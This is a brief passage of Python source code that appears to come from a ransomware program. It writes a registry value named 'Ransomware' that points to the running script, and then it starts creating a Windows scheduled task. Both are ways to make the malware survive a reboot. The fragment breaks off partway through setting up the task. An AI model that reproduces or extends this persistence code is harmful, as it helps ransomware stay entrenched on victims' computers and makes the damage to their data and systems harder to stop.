    reg.SetValueEx(reg_key, 'Ransomware', 0, reg.REG_SZ, sys.argv[0])
    reg.CloseKey(reg_key)

    # Alternatively, create a scheduled task
    scheduler = win32com.client.Dispatch('Schedule.Service')
